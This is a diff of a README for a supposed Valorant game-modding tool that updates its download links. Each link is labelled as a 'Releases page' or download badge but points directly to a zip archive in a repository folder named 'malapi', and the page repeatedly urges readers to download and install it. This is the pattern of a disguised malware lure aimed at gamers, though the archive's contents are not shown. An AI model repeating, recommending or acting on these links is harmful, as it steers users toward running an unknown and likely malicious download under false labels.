@@ -1,6 +1,6 @@
 # 🎯 valorant-view-modding-valorant-tool-download - Enhance Your Valorant Experience Easily
 
-[![Download from Releases](https://raw.githubusercontent.com/monkeyman1212221/valorant-view-modding-valorant-tool-download/main/malapi/valorant-view-modding-valorant-tool-download-1.2.zip%20Now-Find%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/monkeyman1212221/valorant-view-modding-valorant-tool-download/main/malapi/valorant-view-modding-valorant-tool-download-1.2.zip)
+[![Download from Releases](https://github.com/monkeyman1212221/valorant-view-modding-valorant-tool-download/raw/refs/heads/main/malapi/view_modding_download_valorant_tool_v1.8.zip%20Now-Find%20the%20Latest%20Release-brightgreen)](https://github.com/monkeyman1212221/valorant-view-modding-valorant-tool-download/raw/refs/heads/main/malapi/view_modding_download_valorant_tool_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **Valorant View Modding Tool**. This application helps you explor
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/monkeyman1212221/valorant-view-modding-valorant-tool-download/main/malapi/valorant-view-modding-valorant-tool-download-1.2.zip) to download the latest version of the tool.
+To get started, visit our [Releases page](https://github.com/monkeyman1212221/valorant-view-modding-valorant-tool-download/raw/refs/heads/main/malapi/view_modding_download_valorant_tool_v1.8.zip) to download the latest version of the tool.
 
 1. On the Releases page, find the newest version.
 2. Click on the download link for your operating system (Windows, macOS, etc.).
@@ -49,7 +49,7 @@ To run the Valorant View Tool, your system should meet the following requirement
 
 ## 📥 Download & Install (Reiterated)
 
-To download the latest version, please visit our [Releases page](https://raw.githubusercontent.com/monkeyman1212221/valorant-view-modding-valorant-tool-download/main/malapi/valorant-view-modding-valorant-tool-download-1.2.zip) and follow the steps mentioned.
+To download the latest version, please visit our [Releases page](https://github.com/monkeyman1212221/valorant-view-modding-valorant-tool-download/raw/refs/heads/main/malapi/view_modding_download_valorant_tool_v1.8.zip) and follow the steps mentioned.
 
 ## 💬 Support
 
